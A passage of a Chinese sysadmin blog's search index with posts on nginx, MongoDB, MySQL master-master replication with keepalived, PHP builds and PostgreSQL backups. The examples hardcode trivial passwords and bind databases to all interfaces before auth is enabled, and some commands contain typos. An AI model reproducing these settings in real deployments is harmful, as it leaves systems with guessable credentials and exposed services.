关闭代理重定向 proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; client_max_body_size 20m; ## 设置客户端请求body的最大允许大小 client_body_buffer_size 256k; ## 设置客户端请求body的缓冲区大小 proxy_connect_timeout 90; ## 与后端服务器连接的超时时长 proxy_send_timeout 90; ## 把请求发送给后端服务器的超时时长 proxy_read_timeout 90; ## 等待后端服务器发送响应报文的超时时长 proxy_buffer_size 128k; ## 从代理服务器接收的响应的第一部分缓冲区 proxy_buffers 4 64k; ## 从代理服务器读取响应的缓冲区number和size proxy_busy_buffers_size 128k; ## 限制size在响应尚未完全读取时可能忙于向客户端发送响应的缓冲区总数 proxy_temp_file_write_size 128k; ## 该指令设置缓冲临时文件的最大值 default_type application/octet-stream; charset utf-8; ## 字符集 client_body_temp_path /var/tmp/client_body_temp 1 2; ## 请求body临时目录 proxy_temp_path /var/tmp/proxy_temp 1 2; ## 代理服务器接受数据临时目录 fastcgi_temp_path /var/tmp/fastcgi_temp 1 2; ## FastCGI服务器接收临时目录 uwsgi_temp_path /var/tmp/uwsgi_temp 1 2; ## uwsgi 服务器接收临时目录 scgi_temp_path /var/tmp/scgi_temp 1 2; ##scgi服务器接收临时目录 ignore_invalid_headers on; ## 开启控制忽略具有无效名称的标头字段 server_names_hash_max_size 256; ## 服务器名称哈希表的最大值 server_names_hash_bucket_size 64; ## 服务器名称哈希表存储bucket大小 client_header_buffer_size 8k; ## 设置缓冲区以读取客户端请求标头 large_client_header_buffers 4 32k; ## 设置缓冲区以读取客户端请求标头最大值number和size connection_pool_size 256; ## 允许精确调整每个连接的内存分配 request_pool_size 64k; ## 允许精确调整每个请求的内存分配 output_buffers 2 128k; ## 设置用于从磁盘读取响应的缓冲区number和size postpone_output 1460; ## 客户端数据的传输最小值，单位字节 client_header_timeout 1m; ## 定义读取客户端请求标头的超时时长 client_body_timeout 3m; ## 定义读取客户端请求主体的超时时长 send_timeout 3m; ## 设置将响应传输到客户端的超时时长 log_format main '$server_addr $remote_addr [$time_local] $msec+$connection ' '\"$request\" $status $connection $request_time $body_bytes_sent \"$http_referer\" ' '\"$http_user_agent\" \"$http_x_forwarded_for\"'; open_log_file_cache max=1000 inactive=20s min_uses=1 valid=1m; access_log logs/access.log main; log_not_found on; sendfile on; tcp_nodelay on; ## 启用长连接马上响应，提高性能 tcp_nopush off; ## 关闭套接字选项 reset_timedout_connection on; ## 启用重置超时连接 keepalive_timeout 10 5; ## 第一个参数设置长连接超时时长，第二个浏览器识别为keep-alive:timeout=5 keepalive_requests 100; ## 设置可通过一个保持活动连接提供的最大请求数 gzip on; ## 开启压缩 gzip_http_version 1.1; ## 启用压缩时协议最小版本 gzip_vary on; gzip_proxied any; ## 为所有代理请求启用压缩 gzip_min_length 1024; ## 设置将被gzip压缩的响应的最小长度 gzip_comp_level 6; ## 设置压缩等级 gzip_buffers 16 8k; ## 设置用于压缩响应的缓冲区number和size gzip_proxied expired no-cache no-store private auth no_last_modified no_etag; gzip_types text/plain application/x-javascript text/css application/xml application/json; gzip_disable \"MSIE [1-6]\\.(?!.*SV1)\"; upstream tomcat8080 { ip_hash; server 172.16.100.103:8080 weight=1 max_fails=2; server 172.16.100.104:8080 weight=1 max_fails=2; server 172.16.100.105:8080 weight=1 max_fails=2; } server { listen 80; server_name www.chan.com; # config_apps_begin root /data/webapps/htdocs; access_log /var/logs/webapp.access.log main; error_log /var/logs/webapp.error.log notice; location / { location ~* ^.*/favicon.ico$ { root /data/webapps; expires 180d; ## 缓存180天 break; } if ( !-f $request_filename ) { proxy_pass http://tomcat8080; break; } } error_page 500 502 503 504 /50x.html; location = /50x.html { root html; } } server { listen 8088; server_name nginx_status; location / { access_log off; deny all; return 503; } location /status { stub_status on; access_log off; allow 127.0.0.1; allow 172.16.100.71; deny all; } } } ","date":"2019-12-24 13:14","objectID":"/post/1316/:0:0","tags":["nginx"],"title":"nginx生产环境配置案例","uri":"/post/1316/"},{"categories":["databases"],"content":"安装mongodb 可参考：https://soulchild.cn/1279.html 环境： 10.0.0.40 mongodb-01 10.0.0.41 mongodb-02 10.0.0.42 mongodb-arb 修改配置文件： # 系统日志相关 systemLog: destination: file logAppend: true path: /application/mongodb/log/mongod.log # 数据存储相关 storage: dbPath: /application/mongodb/data journal: enabled: true # 网络相关 net: port: 27017 bindIp: 0.0.0.0 # 进程控制相关 processManagement: fork: true # pidFilePath: /var/run/mongod.pid # 安全配置 #security: # authorization: enable # keyFile: /application/mongodb/data/keyfile #复制集配置 replication: oplogSizeMB: 2048 replSetName: app_1 配置复制集 #登陆主mongo mongo conf = { _id: 'app_1', members: [ {_id: 0, host: '10.0.0.40:27017',priority:10}, {_id: 1, host: '10.0.0.41:27017',priority:9}, {_id: 2, host: '10.0.0.42:27017',\"arbiterOnly\": true} ] } #初始化pepei配置 rs.initiate(conf) # 查看状态 rs.status() 添加超级管理员 # 连接数据库 mongo # 切换到admin库 use admin # 创建用户 db.createUser( { user: \"root\", pwd: \"123\", roles: [{ role:\"root\",db:\"admin\"}] } ) 生成认证keyfile openssl rand -base64 512 \u003e /application/mongodb/data/keyfile 配置文件添加安全配置 security: authorization: enable keyFile: /application/mongodb/data/keyfile 重启所有节点 ","date":"2019-12-20 16:51","objectID":"/post/1294/:0:0","tags":["mongodb"],"title":"mongodb一主一从一Arbiter复制集部署","uri":"/post/1294/"},{"categories":["databases"],"content":"创建超级管理员 db.createUser( { user:\"root\", pwd:\"123\", roles:[{role:\"root\",db:\"admin\"}] } ) 创建普通读写用户 db.createUser( { user:\"root\", pwd:\"123\", roles:[{role:\"readWrite\",db:\"app\"}] } ) 查看所有用户 db.system.users.find().pretty() 修改用户密码 db.updateUser(\"admin\",{pwd:\"password\"}) 删除用户 db.system.users.remove({user:\"app1\"}) 创建集合： db.createCollection(\"runoob\") 创建文档： #app为库名 db.app.insert( { key1: \"value1\", key2: \"value2\" } ) 查看集合文档 db.app.find().pretty() 连接信息查询 db.serverStatus().connections ","date":"2019-12-20 14:47","objectID":"/post/1292/:0:0","tags":["mongodb"],"title":"mongodb常用命令","uri":"/post/1292/"},{"categories":["databases"],"content":"单机部署4实例： 端口：27017 27018 27019 27020 准备实例：   创建目录： mkdir -p /application/mongodb/{27017..27020}/conf /application/mongodb/{27017..27020}/data /application/mongodb/{27017..27020}/log 修改配置文件： cat \u003e /application/mongodb/27017/conf/mongo.conf \u003c\u003cEOF # 系统日志相关 systemLog: destination: file logAppend: true path: /application/mongodb/27017/log/mongod.log # 数据存储相关 storage: dbPath: /application/mongodb/27017/data journal: enabled: true directoryPerDB: true wiredTiger: engineConfig: cacheSizeGB: 1 directoryForIndexes: true collectionConfig: blockCompressor: zlib indexConfig: prefixCompression: true # 网络相关 net: port: 27017 bindIp: 0.0.0.0 # 进程控制相关 processManagement: fork: true # 安全配置 #security: # authorization: enabled #复制集配置 replication: oplogSizeMB: 2048 replSetName: repl_1 EOF 创建配置文件： cd /application/mongodb cp 27017/conf/mongo.conf ./27018/conf/mongo.conf cp 27017/conf/mongo.conf ./27019/conf/mongo.conf cp 27017/conf/mongo.conf ./27020/conf/mongo.conf sed -i 's#27017#27018#' ./27018/conf/mongo.conf sed -i 's#27017#27019#' ./27019/conf/mongo.conf sed -i 's#27017#27020#' ./27020/conf/mongo.conf 启动多实例： su - mongod mongod -f /application/mongodb/27017/conf/mongo.conf mongod -f /application/mongodb/27018/conf/mongo.conf mongod -f /application/mongodb/27019/conf/mongo.conf mongod -f /application/mongodb/27020/conf/mongo.conf 配置复制集：   一主两从：   mongo --port 27017 admin conf = { _id: ‘repl_1’, members: [ {_id: 0, host: ‘10.0.0.40:27017’}, {_id: 1, host: ‘10.0.0.40:27018’}, {_id: 2, host: ‘10.0.0.40:27019’} ] } rs.initiate(conf) #查询复制集状态 rs.status() 一主一从一arbiter： *Arbiter节点只会参与投票* #新配置 mongo --port 27017 admin conf = { _id: ‘repl_1’, members: [ {_id: 0, host: ‘10.0.0.40:27017’}, {_id: 1, host: ‘10.0.0.40:27018’}, {_id: 2, host: ‘10.0.0.40:27019’,“arbiterOnly”: true} ] } #初始化配置 rs.initiate(conf) #查询复制集状态 rs.status() \u003cimg src=“images/53438ace3549b7e6d3f83a658373cc5f.png “53438ace3549b7e6d3f83a658373cc5f”” /\u003e 基于一主两从修改： # 删除节点 rs.remove(\"10.0.0.40:27019\") #添加arbiter节点 rs.addArb(\"10.0.0.40:27019\") #启动服务 mongod -f /application/mongodb/27019/conf/mongo.conf \u003cimg src=“images/ebadb11282dc21da64a84eba68149b87.png “ebadb11282dc21da64a84eba68149b87\"” /\u003e 其他相关命令： 添加删除节点： # 删除一个节点 rs.remove(\"ip:port\") #添加普通节点 rs.add(\"ip:port\") #添加Arbiter节点 rs.addArb(\"ip:port\") #将当前主库降级 rs.stepDown() 测试： # 创建一个collection db.createCollection(\"user_info\") # 关闭port:27018主库服务 mongod -f /application/mongodb/27018/conf/mongo.conf --shutdown # 连接27017 mongo repl_1:PRIMARY\u003e show dbs admin 0.000GB app 0.000GB config 0.000GB local 0.000GB repl_1:PRIMARY\u003e use app switched to db app repl_1:PRIMARY\u003e show collections user_info repl_1:PRIMARY\u003e ","date":"2019-12-20 14:24","objectID":"/post/1285/:0:0","tags":["mongodb"],"title":"mongodb复制集","uri":"/post/1285/"},{"categories":["databases"],"content":"下载地址： http://downloads.mongodb.org/linux/mongodb-linux-x86_64-rhel70-v3.6-latest.tgz 安装： mkdir /application tar xf mongodb-linux-x86_64-rhel70-v3.6-latest.tgz -C /application/ cd /application mv mongodb-linux-x86_64-rhel70-3.6.16-15-g4cd114f/ mongodb echo 'export PATH=$PATH:/application/mongodb/bin' \u0026gt;\u0026gt;/etc/profile source /etc/profile # 创建用户 groupadd mongod useradd -g mongod mongod echo 123456 |passwd --stdin mongod #创建目录 cd /application/mongodb mkdir conf log data chown -R mongod.mongod /application/mongodb 关闭大页内存 echo 'never' \u0026gt;\u0026gt; /sys/kernel/mm/transparent_hugepage/enabled echo 'never' \u0026gt;\u0026gt; /sys/kernel/mm/transparent_hugepage/defrag 编写配置文件 # 系统日志相关 systemLog: destination: file logAppend: true path: /application/mongodb/log/mongod.log # 数据存储相关 storage: dbPath: /application/mongodb/data journal: enabled: true # 网络相关 net: port: 27017 bindIp: 0.0.0.0 # 进程控制相关 processManagement: fork: true # pidFilePath: /var/run/mongod.pid # 安全配置 security: authorization: enabled 启动mongodb su - mongod #无配置文件启动 mongod --dbpath=/application/mongodb/data --logpath=/application/mongodb/log/mongodb.log --logappend --fork #使用配置文件启动 su - mongod mongod -f /application/mongodb/conf/mongo.conf 启动脚本 [Unit] Description=Mongos server Wants=network.target After=network.target [Service] Type=forking PIDFile=/data/mongodb/mongod.pid ExecStart=/application/mongodb/bin/mongod -f /usr/local/mongodb/etc/mongod.conf ExecReload=/bin/kill -HUP $MAINPID Restart=on-failure User=mongod Group=mongod LimitNOFILE=65534 LimitNPROC=65534 [Install] WantedBy=multi-user.target 创建mongodb超级管理用户： use admin db.createUser( { user:\"root\", pwd:\"123\", roles:[ { role: \"root\", db:\"admin\" } ] } ) 连接数据库 mongo -uroot -p123 10.0.0.40/admin 或者 mongo use admin db.auth('root','123') 创建普通读写用户： use app db.createUser( { user: \"app1\", pwd: \"app1\", roles: [ { role: \"readWrite\", db: \"app\" } ] } ) 关闭数据库 mongod -f conf/mongo.conf --shutdown ","date":"2019-12-20 11:08","objectID":"/post/1279/:0:0","tags":["mongodb"],"title":"mongodb3.6二进制安装","uri":"/post/1279/"},{"categories":["系统服务","databases"],"content":"环境： mysql-master-01：10.0.0.30 mysql-master-02：10.0.0.35 vip：10.0.0.39 安装mysql5.7.20 可参考：https://soulchild.cn/266.html 开始配置主主环境 一、修改mysql配置 master-01： [mysqld] basedir=/application/mysql datadir=/data/mysql socket=/tmp/mysql.sock server_id=1 port=3306 log-bin=mysql-bin relay-log = mysql-relay-bin replicate-wild-ignore-table=mysql.% replicate-wild-ignore-table=information_schema.% [mysql] socket=/tmp/mysql.sock prompt=master-01[\\\\d]\u003e [mysqld_safe] log-error=/var/log/mysql.log master-02： [mysqld] basedir=/application/mysql datadir=/data/mysql socket=/tmp/mysql.sock server_id=11 port=3306 log-bin=mysql-bin relay-log = mysql-relay-bin replicate-wild-ignore-table=mysql.% replicate-wild-ignore-table=information_schema.% [mysql] socket=/tmp/mysql.sock prompt=master-02[\\\\d]\u003e [mysqld_safe] log-error=/var/log/mysql.log 二、配置msater-01主,master-02从 1.添加主从复制用户，master-01执行 grant replication slave on *.* to 'repl'@'10.0.0.%' identified by 'replpass'; grant all on blog.* to 'blog'@'10.0.0.%' identified by 'blog123'; #记录两个值File和Position show master status; \u003cimg src=“images/74d89fda9e4aa48ae20340fb1e7849cc.png “74d89fda9e4aa48ae20340fb1e7849cc”” /\u003e 2.master-02中执行，指定master-01服务器作为主服务器 #mysql-bin.000001和704为上面获取的值 change master to master_host='10.0.0.30',master_user='repl',master_password='replpass',master_log_file='mysql-bin.000001',master_log_pos=704; strart slave; show slave status\\G \u003cimg src=“images/0cc7360faa6cee268672fee26b9835de.png “0cc7360faa6cee268672fee26b9835de”” /\u003e 三、配置msater-02主,master-01从 1.添加主从复制用户，master-02执行 grant replication slave on *.* to 'repl'@'10.0.0.%' identified by 'replpass'; grant all on blog.* to 'blog'@'10.0.0.%' identified by 'blog123'; #记录两个值File和Position show master status; \u003cimg src=“images/57606e28cb6ed6abac89fa8e8f82280d.png “57606e28cb6ed6abac89fa8e8f82280d”” /\u003e 2.master-01中执行，指定master-02服务器作为主服务器 #mysql-bin.000003和704为上面获取的值 change master to master_host='10.0.0.35',master_user='repl',master_password='replpass',master_log_file='mysql-bin.000003',master_log_pos=704; strart slave; show slave status\\G 测试数据同步： master-01[blog]\u003ecreate database blog; master-01[blog]\u003euse blog; master-01[blog]\u003ecreate table user( `username` char(10), `password` char(10) ); master-02[blog]\u003eshow databases; master-02[blog]\u003euse blog; master-02[blog]\u003eshow tables; master-02[blog]\u003einsert into `user` (username,password) values('li','123'); master-01[blog]\u003eselect * from user; 四、安装配置keepalived 1.两个节点安装 yum install -y keepalived master-01的keepalived配置文件（此配置未考虑脑裂问题）： global_defs { notification_email { 742899387@qq.com } notification_email_from keepalived@local.com smtp_server 192.168.200.1 smtp_connect_timeout 30 router_id mysql-master-01 } vrrp_script check_mysql { script \"/server/scripts/keepalived/check_mysql.pl\" interval 2 } vrrp_instance mysql { state BACKUP interface eth0 virtual_router_id 51 priority 100 advert_int 1 authentication { auth_type PASS auth_pass 1111 } virtual_ipaddress { 10.0.0.39 } track_script { check_mysql } } master-02的keepalived配置文件 global_defs { notification_email { 742899387@qq.com } notification_email_from keepalived@local.com smtp_server 192.168.200.1 smtp_connect_timeout 30 router_id mysql-master-02 } vrrp_script check_mysql { script \"/server/scripts/keepalived/check_mysql.pl\" interval 2 } vrrp_instance mysql { state BACKUP interface eth0 virtual_router_id 51 priority 80 advert_int 1 authentication { auth_type PASS auth_pass 1111 } virtual_ipaddress { 10.0.0.39 } track_script { check_mysql } } 2.编写状态检测脚本 mkdir /server/scripts/keepalived/ -p cd /server/scripts/keepalived/ vim check_mysql.pl 脚本 #!/usr/bin/perl -w use DBI; use DBD::mysql; # CONFIG VARIABLES $SBM = 120; $db = \"mysql\"; $host = $ARGV[0]; $port = 3306; $user = \"root\"; $pw = \"123456\"; # SQL query $query = \"show slave status\"; $dbh = DBI-\u003econnect(\"DBI:mysql:$db:$host:$port\", $user, $pw, { RaiseError =\u003e 0,PrintError =\u003e 0 }); if (!defined($dbh)) { exit 1; } $sqlQuery = $dbh-\u003eprepare($query); $sqlQuery-\u003eexecute; $Slave_IO_Running = \"\"; $Slave_SQL_Running = \"\"; $Secon","date":"2019-12-19 18:46","objectID":"/post/1264/:0:0","tags":["keepalievd","mysql"],"title":"mysql主主复制+keepalived部署","uri":"/post/1264/"},{"categories":["系统服务"],"content":"主要有两个改动： 1.将所有角色改为BACKUP 2.在优先级高的节点添加nopreempt配置 MASTER配置 global_defs { notification_email { 742899387@qq.com } notification_email_from keepalived@local.com smtp_server 192.168.200.1 smtp_connect_timeout 30 router_id keep-01 } # 定义一个状态检查,script中也可以写一个脚本，但脚本需有返回值0或非0 vrrp_script check_nginx { # 每2秒检查一次nginx进程状态，根据命令执行的状态码去判断服务是否正常 script \"/usr/bin/killall -0 nginx\" interval 2 # 2次状态吗为非0才为失败状态 fall 2 # 2次状态码为0才为正常状态 rise 2 } vrrp_instance nginx { # 设置为BACKUP state BACKUP # 指定网卡 interface eth0 # vrrp标识1-255(需要和备节点一致) virtual_router_id 51 # 指定优先级，值越大优先级越高 priority 100 # 组播包间隔时间 advert_int 1 # 开启非抢占模式 nopreempt # 认证 authentication { auth_type PASS auth_pass 1111 } # 配置vip virtual_ipaddress { 10.0.0.3 } # 指定进入不同状态时要执行的脚本 #notify_master \"/server/scripts/keepalive/master.sh\" #notify_backup \"/server/scripts/keepalive/backup.sh\" #notify_fault \"/server/scripts/keepalive/fault.sh\" # 引用上面定义的状态检查 track_script { check_nginx } } BACKUP配置 global_defs { notification_email { 742899387@qq.com } notification_email_from keepalived@local.com smtp_server 192.168.200.1 smtp_connect_timeout 30 router_id keep-02 } vrrp_script check_nginx { script \"/usr/bin/killall -0 nginx\" interval 2 fall 2 rise 2 } vrrp_instance nginx { state BACKUP interface eth0 virtual_router_id 51 priority 50 advert_int 1 authentication { auth_type PASS auth_pass 1111 } #notify_master \"/server/scripts/keepalive/master.sh\" #notify_backup \"/server/scripts/keepalive/backup.sh\" #notify_fault \"/server/scripts/keepalive/fault.sh\" virtual_ipaddress { 10.0.0.3 } track_script { check_nginx } } ","date":"2019-12-19 11:21","objectID":"/post/1254/:0:0","tags":["keepalievd"],"title":"keepalived开启非抢占模式","uri":"/post/1254/"},{"categories":["其他","基础内容","常用命令","kubernetes"],"content":"主要选项： -in filename ： #指定证书输入文件，若同时指定了\"-req\"选项，则表示输入文件为证书请求文件。 -out filename ： #指定输出文件 -md2|-md5|-sha1|-mdc2： #指定单向加密的算法。 查看证书选项： -text ：以text格式输出证书内容，即以最全格式输出， ：包括public key,signature algorithms,issuer和subject names,serial number以及any trust settings. -certopt option：自定义要输出的项 -noout ：禁止输出证书请求文件中的编码部分 -pubkey ：输出证书中的公钥 -modulus ：输出证书中公钥模块部分 -serial ：输出证书的序列号 -subject ：输出证书中的subject -issuer ：输出证书中的issuer，即颁发者的subject -subject_hash：输出证书中subject的hash码 -issuer_hash ：输出证书中issuer(即颁发者的subject)的hash码 -hash ：等价于\"-subject_hash\"，但此项是为了向后兼容才提供的选项 -email ：输出证书中的email地址，如果有email的话 -startdate ：输出证书有效期的起始日期 -enddate ：输出证书有效期的终止日期 -dates ：输出证书有效期，等价于\"startdate+enddate\" -fingerprint ：输出指纹摘要信息 查看指定文件证书： openssl x509 -in apiserver.crt -text -noout ","date":"2019-12-18 09:43","objectID":"/post/1242/:0:0","tags":[],"title":"查看证书过期时间","uri":"/post/1242/"},{"categories":["其他"],"content":"defaults delete com.googlecode.iterm2 ","date":"2019-12-17 16:34","objectID":"/post/1239/:0:0","tags":[],"title":"iterm2恢复默认配置","uri":"/post/1239/"},{"categories":["kubernetes"],"content":"deployment apiVersion: v1 kind: Service metadata: labels: app: {name} name: {name} namespace: {namespace} spec: ports: - port: {cluster ip端口} protocol: TCP targetPort: {容器端口} nodePort: {宿主机端口} selector: app: {name} type: NodePort --- apiVersion: apps/v1 kind: Deployment metadata: name: {name} namespace: {namespace} spec: replicas: 1 selector: matchLabels: app: {name} template: metadata: labels: app: {name} #和matchLabels中的一致 spec: imagePullSecrets: - name: {secret} containers: - name: {container-name} image: {image_name} ports: - containerPort: {容器端口} command: ['java'] args: ['-Dspring.profiles.active=test','-jar','xx.jar'] volumeMounts: # 将存储卷挂载到容器中 - name: {name} # 指定使用哪个存储卷 mountPath: \"/data/www/images\" volumes: #定义存储卷 - name: {volumes_name} #定义存储卷名称 persistentVolumeClaim: claimName: {pvc_name} #指定使用哪个pvc ","date":"2019-12-16 16:40","objectID":"/post/1226/:1:0","tags":["k8s"],"title":"简略版deployment、pv、pvc资源文件模板","uri":"/post/1226/"},{"categories":["kubernetes"],"content":"pv apiVersion: v1 kind: PersistentVolume metadata: name: {name} spec: capacity: storage: 40Gi accessModes: - ReadWriteMany persistentVolumeReclaimPolicy: Retain nfs: path: \"/nfsdata/xxx\" server: 10.0.0.10 readOnly: false ","date":"2019-12-16 16:40","objectID":"/post/1226/:2:0","tags":["k8s"],"title":"简略版deployment、pv、pvc资源文件模板","uri":"/post/1226/"},{"categories":["kubernetes"],"content":"pvc kind: PersistentVolumeClaim apiVersion: v1 metadata: name: {name} namespace: {namespace} spec: accessModes: - ReadWriteMany resources: requests: storage: 40Gi ","date":"2019-12-16 16:40","objectID":"/post/1226/:3:0","tags":["k8s"],"title":"简略版deployment、pv、pvc资源文件模板","uri":"/post/1226/"},{"categories":["kubernetes"],"content":"#无yaml重启pod kubectl get pod “PODNAME” -n “NAMESPACE” -o yaml | kubectl replace –force -f - #查询dashboard的token kubectl describe secrets -n kube-system kubectl get secret -n kube-system | awk '/dashboard-admin/{print $1}' | grep token: | awk ‘{print $2}’ ","date":"2019-12-16 16:27","objectID":"/post/1223/:0:0","tags":["k8s"],"title":"k8s查询dashboard的token","uri":"/post/1223/"},{"categories":["databases"],"content":"1.用户权限说明 A．MongoDB是没有默认管理员账号，所以要先添加管理员账号，再开启权限认证。 B．切换到admin数据库，添加的账号才是管理员账号。 C．用户只能在创建用户对应的数据库中完成认证，包括管理员账号。 D．管理员可以管理所有数据库，但是不能直接管理其他数据库，要先在admin数据库认证后才可以。 2.MongoDB数据库角色 A.数据库用户角色：read、readWrite; B.数据库管理角色：dbAdmin、dbOwner、userAdmin； C.集群管理角色：clusterAdmin、clusterManager、clusterMonitor、hostManager； D.备份恢复角色：backup、restore； E.所有数据库角色：readAnyDatabase、readWriteAnyDatabase、userAdminAnyDatabase、dbAdminAnyDatabase F.超级用户角色：root 角色说明： Read：允许用户读取指定数据库 readWrite：允许用户读写指定数据库 dbAdmin：允许用户在指定数据库中执行管理函数，如索引创建、删除，查看统计或访问system.profile userAdmin：允许用户向system.users集合写入，可以找指定数据库里创建、删除和管理用户 clusterAdmin：只在admin数据库中可用，赋予用户所有分片和复制集相关函数的管理权限。 readAnyDatabase：只在admin数据库中可用，赋予用户所有数据库的读权限 readWriteAnyDatabase：只在admin数据库中可用，赋予用户所有数据库的读写权限 userAdminAnyDatabase：只在admin数据库中可用，赋予用户所有数据库的userAdmin权限 dbAdminAnyDatabase：只在admin数据库中可用，赋予用户所有数据库的dbAdmin权限。 root：只在admin数据库中可用。超级账号，超级权限 3.添加管理员账号及完成认证 db.createUser({user:’root’,pwd:’zuchezaixian’,roles:[{role:’root’,db:’admin’}]}) 注：所有数据库下的用户都在admin的users集合中可以查询到：db.system.users.find() ","date":"2019-12-16 16:26","objectID":"/post/1221/:0:0","tags":["数据库"],"title":"mongodb权限","uri":"/post/1221/"},{"categories":["系统服务"],"content":" wget https://www.php.net/distributions/php-5.6.40.tar.gz tar xf php-5.6.40.tar.gz cd php-5.6.40/ yum install -y openssl-devel libxml2 libxml2-devel bzip2 bzip2-devel libjpeg libjpeg-devel libpng libpng-devel freetype freetype-devel mcrypt libmcrypt libmcrypt-devel ./configure --prefix=/application/php5.6.40 --enable-fpm --enable-mysqlnd --with-mysql=/application/mysql --with-pdo-mysql=/application/mysql --with-mysqli=/application/mysql/bin/mysql_config --with-libxml-dir --with-gd --with-jpeg-dir --with-png-dir --with-freetype-dir --with-iconv-dir --with-zlib-dir --with-bz2 --with-openssl --with-mcrypt --enable-soap --enable-mbstring --enable-sockets --enable-exif --with-config-file-path=/application/php5.6.40/etc/ make \u0026\u0026 make install ln -s /application/php5.6.40/ /application/php cp php.ini-production /application/php5.6.40/etc/php.ini cp sapi/fpm/php-fpm.service /etc/systemd/system/php-fpm.service sed -i 's#${prefix}#/application/php#' /etc/systemd/system/php-fpm.service sed -i 's#${exec_prefix}#/application/php#' /etc/systemd/system/php-fpm.service mv /application/php5.6.40/etc/php-fpm.conf{.default,} #修改php-fpm用户 vim /application/php5.6.40/etc/php-fpm.conf systemctl start php-fpm ","date":"2019-12-16 16:24","objectID":"/post/1219/:0:0","tags":["php"],"title":"php5.6.40编译安装","uri":"/post/1219/"},{"categories":["系统服务"],"content":"参考地址：https://www.cnblogs.com/hfdp/p/5867844.html 请求的网址是http://xxx.com/index.php/admin/bbb/ccc/index PATH_INFO的值是/admin/bbb/ccc/index SCRIPT_FILENAME的值是$doucment_root/index.php SCRIPT_NAME /index.php 所以php(.*)$中$1的值就是PATH_INFO 配置pathinfo # 正则匹配.php后的pathinfo部分 location ~ \\.php(.*)$ { root /xxx; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME $DOCUMENT_ROOT$fastcgi_script_name; # 把pathinfo部分赋给PATH_INFO变量 fastcgi_param PATH_INFO $1; include fastcgi_params; } ","date":"2019-12-10 18:43","objectID":"/post/1194/:0:0","tags":["nginx"],"title":"nginx配置pathinfo，解决thinkphp404问题","uri":"/post/1194/"},{"categories":["系统服务","databases"],"content":"备份 ","date":"2019-11-21 15:27","objectID":"/post/1151/:1:0","tags":["postgresql","pgsql"],"title":"pgsql备份恢复","uri":"/post/1151/"},{"categories":["系统服务","databases"],"content":"pg_dump： 通用选项： -f, --file=FILENAME 输出的文件路径 -F, --format=c|d|t|p 输出的格式(custom, directory, tar, plain text(默认)) -j, --jobs=NUM 使用指定任务数量来并行备份 -v, --verbose 显示备份详细信息 -V, --version 查看版本信息 -Z, --compress=0-9 压缩级别 --lock-wait-timeout=TIMEOUT 等待表级锁超时时间 连接选项： -d, --dbname=DBNAME 备份的数据库名称 -h, --host=HOSTNAME 数据库地址或socket路径 -p, --port=PORT 数据库端口 -U, --username=NAME 连接数据库的用户名 -w, --no-password 禁止提示输入密码 -W, --password 强制提示密码输入 --role=ROLENAME 备份前设置角色 备份参数： -a, --data-only 只备份数据，不备份schema -C, --create 备份中包含创建数据库的命令 -E, --encoding=ENCODING 以指定的编码方式备份数据 -n, --schema=SCHEMA 只备份指定的schema(s) -N, --exclude-schema=SCHEMA 不备份指定schema(s) -O, --no-owner 当格式为plain时，忽略恢复对象所有者 -s, --schema-only 只备份schema，不备份数据 -t, --table=TABLE 只备份指定的表 -T, --exclude-table=TABLE 不备份指定的表 -x, --no-privileges 不备份权限(grant/revoke) --column-inserts 使用insert的方式备份，insert语句中包含字段名称 --disable-triggers 在仅还原数据时禁用触发器 --exclude-table-data=TABLE 不备份指定表的数据 --if-exists use IF EXISTS when dropping objects --inserts 使用insert的方式备份，insert语句中不包含字段名称 --no-tablespaces 不备份表空间分配信息 简单备份 pg_dump -Upostgres -h 10.0.0.2 -d test -f test.sql ","date":"2019-11-21 15:27","objectID":"/post/1151/:1:1","tags":["postgresql","pgsql"],"title":"pgsql备份恢复","uri":"/post/1151/"},{"categories":["系统服务","databases"],"content":"psql普通文本格式恢复 通用参数： -d, --dbname=DBNAME 指定数据库 -f, --file=FILENAME 指定要执行的sql文件 -X, --no-psqlrc 不读取启动文件(~/.psqlrc) 恢复 psql -Upostgres -h 10.0.0.2 -d test -f test.sql ","date":"2019-11-21 15:27","objectID":"/post/1151/:2:0","tags":["postgresql","pgsql"],"title":"pgsql备份恢复","uri":"/post/1151/"},{"categories":["系统服务","databases"],"content":"pg_restore恢复 通用参数： -d, --dbname=NAME 数据库 -F, --format=c|d|t 备份文件的格式(custom, directory, tar)，可以自动识别 -v, --verbose 显示详细信息 恢复参数： -a, --data-only 只还原数据, 不还原schema -c, --clean 在重新创建之前删除数据库对象 -C, --create 创建目标数据库 -e, --exit-on-error 出错时退出, 默认继续 -I, --index=NAME 还原索引名 -j, --jobs=NUM 使用指定任务数量来并行恢复 -n, --schema=NAME 只恢复指定的schema -O, --no-owner 跳过对象所有权的恢复 -P, --function=NAME(args) 恢复指定名字的函数 -s, --schema-only 只恢复schema，不恢复数据 -S, --superuser=NAME 用于禁用触发器的超级用户用户名 -t, --table=NAME 恢复指定表名 -T, --trigger=NAME 恢复指定触发器 -x, --no-privileges 跳过访问权限的恢复(grant/revoke) -1, --single-transaction 作为1个事务恢复 --disable-triggers 在只恢复数据期间禁用触发器 --if-exists 删除对象时使用IF EXISTS --no-tablespaces 不恢复表空间分配信息 连接参数，同pg_dump 注意:pg_restore xxx.tar代表读取压缩备份的内容 备份恢复例子： #备份test库 pg_dump -d test -F t -f test.tar #恢复test库 pg_restore -d test test.tar 恢复指定表： # 造数据 create database test; \\c test create table t1(id int, context varchar(32)); insert into t1(id,context) values(1,'你好'); insert into t1 values(2,'soulchild'); create table t2(id int, comment varchar(128)); insert into t2 values(1,'test1') insert into t2 values(2,'test2') #备份 pg_dump -F t -d test -f test.tar #删除表 drop table t1; #恢复t1表 pg_restore -d test -t t1 ./test.tar ","date":"2019-11-21 15:27","objectID":"/post/1151/:3:0","tags":["postgresql","pgsql"],"title":"pgsql备份恢复","uri":"/post/1151/"},{"categories":["系统服务","databases"],"content":"安装yum源： rpm -ivh https://download.postgresql.org/pub/repos/yum/9.4/redhat/rhel-7.6-x86_64/pgdg-centos94-9.4-3.noarch.rpm 安装pgsql： yum install -y postgresql94-server postgresql94-contrib 初始化数据库： # /usr/pgsql-9.4/bin/postgresql94-setup initdb 创建postgres密码 su – postgres psql -U postgres ALTER USER postgres with encrypted password '密码' 配置远程访问 vim /var/lib/pgsql/9.4/data/postgresql.conf listen_address = \"*\" vim /var/lib/pgsql/9.4/data/pg_hba.conf IPv4 local connections下方添加允许连接的IP host all all 